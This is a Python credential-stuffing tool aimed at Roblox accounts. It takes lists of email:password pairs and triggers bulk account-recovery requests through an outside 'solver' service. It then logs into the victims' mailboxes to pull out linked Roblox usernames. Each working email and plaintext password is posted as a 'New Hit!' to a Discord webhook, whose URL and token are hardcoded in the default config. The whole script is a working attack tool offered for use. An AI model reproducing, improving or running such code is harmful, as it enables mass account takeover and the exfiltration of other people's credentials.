import asyncio
import aiohttp
import time
import json
import os
import sys
from datetime import datetime
from typing import List, Dict

API_URL = "https://solver-three.vercel.app"

def parse_usernames(preview):
    """Extract usernames from email previews."""
    try:
        if 'Your accounts are listed below:' not in preview:
            return []
        accounts = preview.split('Your accounts are listed below:')[1]
        if 'Thank You' in accounts:
            accounts = accounts.split('Thank You')[0]

        return [line.strip() for line in accounts.split('*') if line.strip()]
    except Exception as e:
        print(f"[ERROR] Failed to parse usernames: {e}")
        return []

def load_config():
    """Load configuration from config.json or create a new one."""
    if not os.path.exists('config.json'):
        config = {
            "webhook_url": "https://discord.com/api/webhooks/1277640847395131525/tVX9Mwr2Zs-YppaD1OmRklHjVv45-MtbyRxfdc3lcDTbLztwI_vhG6NGnWjgcaLvdvPe",
            "settings": {
                "concurrent_limit": 100,
                "batch_size": 20,
                "progress_update_delay": 0.1
            },
            "setup_complete": True
        }
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)
        print("Config file created. Please fill in your webhook URL in config.json")
        sys.exit(1)

    with open('config.json', 'r') as f:
        config = json.load(f)

    return config

class Checker:
    def __init__(self, config: dict):
        self.config = config
        self.concurrent_limit = config['settings']['concurrent_limit']
        self.webhook_url = config['webhook_url']
        self.stats = {"sent": 0, "failed": 0, "hits": 0, "invalid": 0, "rbx_hits": 0}
        self.lock = asyncio.Lock()
        self.semaphore = asyncio.Semaphore(self.concurrent_limit)
        self.start_time = time.time()

    async def update_title(self):
        """Updates the console title dynamically."""
        while True:
            elapsed = time.time() - self.start_time
            cpm = (self.stats['hits'] / elapsed) * 60 if elapsed > 0 else 0
            sys.stdout.write(f"\33]0;CPM: {int(cpm)} | Hits: {self.stats['hits']} | Invalid: {self.stats['invalid']}\a")
            sys.stdout.flush()
            await asyncio.sleep(1)

    async def send_recovery(self, session: aiohttp.ClientSession, emails: List[str]):
        """Sends recovery requests in batches."""
        tasks = []
        for i in range(0, len(emails), 20):
            batch = emails[i:i+20]
            tasks.append(asyncio.create_task(self._process_batch(session, batch)))
        await asyncio.gather(*tasks)

    async def _process_batch(self, session, emails):
        """Handles sending a batch of recovery requests."""
        async with session.post(f"{API_URL}/recoverfile", json={"emails": emails}) as r:
            data = await r.json()
            sent = sum(1 for v in data.get('results', {}).values() if v)
            failed = len(emails) - sent
            async with self.lock:
                self.stats['sent'] += sent
                self.stats['failed'] += failed
                print(f"Sent: {self.stats['sent']} | Failed: {self.stats['failed']}")

    async def get_rbx_info(self, session, username):
        """Fetches Roblox account details."""
        try:
            async with session.get(f"{API_URL}/get/all/{username}") as r:
                if r.status == 200:
                    return await r.json()
        except Exception as e:
            print(f"[ERROR] Failed to fetch RBX info for {username}: {e}")
        return None

    async def send_hook(self, email, password, usernames, session):
        """Sends hits to Discord webhook."""
        if not self.webhook_url:
            return
        embed = {
            "title": "New Hit!",
            "description": f"**Email:** `{email}`\n**Pass:** `{password}`",
            "color": 65280,
            "fields": []
        }
        for user in usernames:
            info = await self.get_rbx_info(session, user)
            if info:
                embed["fields"].append({"name": user, "value": f"ID: {info.get('userId', 'N/A')}"})
        
        async with session.post(self.webhook_url, json={"embeds": [embed]}) as r:
            if r.status != 200:
                print(f"[ERROR] Webhook failed with status {r.status}")

    async def check(self, session, email, password):
        """Checks if the email has Roblox accounts linked."""
        async with self.semaphore:
            try:
                async with session.post(f"{API_URL}/solve", json={"email": email, "password": password}) as r:
                    result = await r.json()
                    usernames = parse_usernames(result.get("preview", ""))
                    if usernames:
                        async with self.lock:
                            self.stats['hits'] += 1
                        await self.send_hook(email, password, usernames, session)
                    else:
                        async with self.lock:
                            self.stats['invalid'] += 1
            except Exception as e:
                print(f"[ERROR] Failed checking {email}: {e}")

    async def check_all(self, accounts):
        """Runs the full checking process."""
        async with aiohttp.ClientSession() as session:
            await self.send_recovery(session, [acc['email'] for acc in accounts])
            tasks = [self.check(session, acc['email'], acc['password']) for acc in accounts]
            await asyncio.gather(*tasks)

async def main():
    config = load_config()
    checker = Checker(config)
    
    if not os.path.exists("emails.txt"):
        print("emails.txt not found! Creating...")
        with open("emails.txt", "w") as f:
            f.write("example@example.com:password")
        return
    
    with open("emails.txt", "r") as f:
        accounts = [{"email": line.split(":")[0], "password": line.split(":")[1].strip()} for line in f if ":" in line]
    
    print(f"Loaded {len(accounts)} accounts")
    await checker.check_all(accounts)

if __name__ == "__main__":
    asyncio.run(main())
